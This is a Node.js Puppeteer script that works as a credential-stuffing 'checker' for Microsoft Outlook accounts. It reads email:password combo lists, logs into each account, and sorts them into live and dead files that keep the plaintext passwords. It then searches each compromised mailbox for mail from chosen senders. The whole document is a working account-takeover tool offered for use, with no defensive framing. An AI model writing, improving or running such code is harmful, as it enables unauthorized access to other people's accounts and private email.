const puppeteer = require("puppeteer");
const fs = require("fs");
const fsp = require("fs").promises;
const path = require("path");
const readline = require("readline");
const chalk = require("chalk");

// URLs as constants
const LOGIN_URL = "https://login.live.com/login.srf?..."; // Your login URL
const MAILBOX_URL = "https://outlook.live.com/owa/..."; // Your mailbox URL
const SEARCH_INPUT_SELECTOR = "#topSearchInput";
const SEARCH_BUTTON_SELECTOR = 'button[aria-label="Search"]';
const STAY_SIGNED_IN_SELECTOR = "#kmsiTitle";
const EMAIL_ERROR_SELECTOR = "#i0116Error";
const PASSWORD_ERROR_SELECTOR = "#i0118Error";

// Sleep function to pause execution
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Stats to track the results
const stats = {
  total: 0,
  checked: 0,
  live: 0,
  dead: 0,
  startTime: null,
};

// Function to ensure the output folder exists
const ensureFolderExists = async (folderPath) => {
  try {
    await fsp.access(folderPath);
  } catch {
    await fsp.mkdir(folderPath, { recursive: true });
  }
};

// Function to read filters from filter.txt
const readFilters = async (filePath) => {
  try {
    const data = await fsp.readFile(filePath, "utf8");
    const filters = data
      .trim()
      .split("\n")
      .filter((email) => email);
    return filters.length > 0 ? filters : null;
  } catch (error) {
    return null; // Return null if file is missing
  }
};

// Function to ask the user if they want to proceed without filters
const askToProceedWithoutFilters = async () => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) => {
    rl.question(
      "No filters found. Proceed without filtering? (y/n): ",
      (answer) => {
        rl.close();
        resolve(answer.toLowerCase() === "y");
      }
    );
  });
};

// Function to handle Puppeteer login and email search
const checkEmailWithPuppeteer = async (
  email,
  password,
  filters,
  liveWriter,
  deadWriter
) => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  try {
    console.log(`Attempting login for: ${email}`);

    // Step 1: Navigate to the Microsoft login page
    await page.goto(LOGIN_URL, { waitUntil: "networkidle2" });

    // Step 2: Fill in the email and handle potential errors
    await page.type("#i0116", email, { delay: 100 });
    await page.click("#idSIButton9");

    try {
      await page.waitForSelector(EMAIL_ERROR_SELECTOR, { timeout: 5000 });
      const errorMsg = await page.$eval(
        EMAIL_ERROR_SELECTOR,
        (el) => el.textContent
      );
      console.log(chalk.red(`❌ Email error: ${errorMsg}`));
      deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
      return;
    } catch (e) {
      // No email error, proceed
    }

    // Step 3: Fill in the password and handle potential errors
    await page.type("#i0118", password, { delay: 100 });
    await page.click("#idSIButton9");

    try {
      await page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 5000 });
      const errorMsg = await page.$eval(
        PASSWORD_ERROR_SELECTOR,
        (el) => el.textContent
      );
      console.log(chalk.red(`❌ Password error: ${errorMsg}`));
      deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
      return;
    } catch (e) {
      // No password error, proceed
    }

    // Step 4: Handle "Stay Signed In?" prompt
    try {
      await page.waitForSelector(STAY_SIGNED_IN_SELECTOR, { timeout: 5000 });
      await page.click("#idSIButton9");
    } catch (e) {
      // No "Stay Signed In" prompt, proceed
    }

    console.log(chalk.green(`✅ Login successful for: ${email}`));

    // Step 5: Perform email search and filter if filters exist
    await page.goto(MAILBOX_URL, { waitUntil: "networkidle0" });
    await page.waitForSelector(SEARCH_INPUT_SELECTOR);

    let liveEntry = `${email}:${password}`;
    if (filters && filters.length > 0) {
      for (const filterEmail of filters) {
        await page.type(SEARCH_INPUT_SELECTOR, `from:${filterEmail}`);
        await page.click(SEARCH_BUTTON_SELECTOR);

        await sleep(3000); // Give time for the search to complete

        try {
          const results = await page.$$eval(".jGG6V.gDC9O", (elements) => elements.length);
          liveEntry += ` | ${results} emails found from ${filterEmail}`;
        } catch (e) {
          liveEntry += ` | No emails found from ${filterEmail}`;
        }

        // Clear the search input field
        await page.evaluate(
          () => (document.querySelector(SEARCH_INPUT_SELECTOR).value = "")
        );
      }
    } else {
      liveEntry += " | No filters applied.";
    }

    stats.live++;
    liveWriter.write(liveEntry + "\n");
    console.log(chalk.green(`✅ ${liveEntry}`));

  } catch (error) {
    stats.dead++;
    console.error(`Login failed for ${email}:`, error);
    deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
  } finally {
    await page.close();
    await browser.close();
    stats.checked++;
  }
};

// Function to process emails from input files
const processFile = async (inputFile, filters) => {
  const outputFolder = path.join(process.cwd(), "output");
  await ensureFolderExists(outputFolder);

  const baseName = path.basename(inputFile, ".txt");
  const liveFile = path.join(outputFolder, `${baseName}_live.txt`);
  const deadFile = path.join(outputFolder, `${baseName}_dead.txt`);

  const liveWriter = fs.createWriteStream(liveFile, { flags: "a" });
  const deadWriter = fs.createWriteStream(deadFile, { flags: "a" });

  const data = await fsp.readFile(inputFile, "utf8");
  const lines = data.trim().split("\n");
  stats.total += lines.length;

  for (let line of lines) {
    const [email, password] = line.split(":");
    await checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter);
    console.log(`Task completed for ${email}`);
    await sleep(1000); // Add delay between requests
  }

  liveWriter.end();
  deadWriter.end();
};

// Main function to manage the workflow
const main = async () => {
  const filters = await readFilters(path.join(__dirname, "filter.txt"));

  if (!filters) {
    const proceed = await askToProceedWithoutFilters();
    if (!proceed) {
      console.log(
        chalk.red("Process aborted due to missing or empty filter.txt.")
      );
      return;
    }
  }

  const inputFiles = await fsp.readdir(path.join(process.cwd(), "input"));
  const txtFiles = inputFiles.filter((file) => file.endsWith(".txt"));

  if (txtFiles.length === 0) {
    console.error(chalk.red("No .txt files found in the input folder."));
    process.exit(1);
  }

  for (const inputFile of txtFiles) {
    await processFile(path.join("input", inputFile), filters);
  }

  console.log(chalk.blue("\nAuthentication process completed."));
};

main().catch(console.error);
